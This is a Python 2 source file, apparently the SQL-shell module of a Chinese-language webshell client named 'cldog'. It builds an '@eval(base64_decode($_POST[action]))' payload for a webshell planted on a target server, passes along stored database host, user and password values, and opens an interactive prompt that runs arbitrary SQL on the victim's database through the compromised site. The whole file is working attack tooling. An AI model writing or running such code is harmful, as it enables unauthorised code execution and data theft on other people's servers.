#!coding=utf8

import help
import connnect.con
import base64
import urllib





def sql():
    #读取设置文件，配置设置信息
    f = open('./cldog.db', 'r')
    URL = f.readline()
    URL = URL.strip()
    Pass = f.readline()
    f.close()

    con = connnect.con.conn()
    con.URL = URL

    f = open('./net.db', 'r')
    tmp = f.read()
    f.close()

    if tmp == '':
        con.proxies = {}
    else:
        con.proxies = {'http': tmp}


    #读入数据模板，构造参数

    f = open('./setting/:sql', 'r')

    sql = Pass + '=@eval(base64_decode($_POST[action]));&action='
    sql += urllib.quote(base64.b64encode(f.readline().strip()))
    f.close()

    f = open('./sql.db', 'r')
    tmp = f.read()
    f.close()

    if tmp == '':
        print '请首先设置sql参数,已退出sql-shell模块'
        return 0
    else:
        host = tmp.split('\n')[0]
        user = tmp.split('\n')[1]
        sqlpass = tmp.split('\n')[2]
        z2 = tmp.split('\n')[3]


    z1=host+'cldogcldogcldog'+user+'cldogcldogcldog'+sqlpass
    sql+='&z1='+z1+'&z2='


    res = con.send(sql+z2)
    if res == '':

        print '构建sql-shell失败，已退出sql-shell模块，请检查主机、用户名、密码、数据库是否正确'
        return 0
    else:
        print '构建成功,欢迎进入sql-shell模块,:help查看帮助'
        if z2=='':
            print '当前已存有数据库--->'
            print res

        print '使用sql语句进行操作'
        while 1:
            cmd = raw_input('[cldog-sql] ^_^ ')


            if cmd==':help':
                print """
                    :sql-database
                        :sql-database cldog 配置数据库
                    
                    :set    查看已配置的配置项
                    
                    :back   退出sql模块
                    """
            elif cmd==':set':
                print 'host:', host
                print 'user:', user
                print 'pass:', sqlpass
                print 'database:',z2
            elif cmd.strip()[0:13]==':sql-database':

                z2=cmd.split(' ')[1]

                f = open('./sql.db', 'w')
                f.write(host + '\n')
                f.write(user + '\n')
                f.write(sqlpass + '\n')
                f.write(z2)
                f.close()
                print '参数设置完成'


            elif cmd == ':back':
                print '已退出sql-shell模块'
                return 0
            else:

                sql += z2 + '&z3='+urllib.quote(base64.b64encode(cmd))
                print con.send(sql).encode('utf-8')


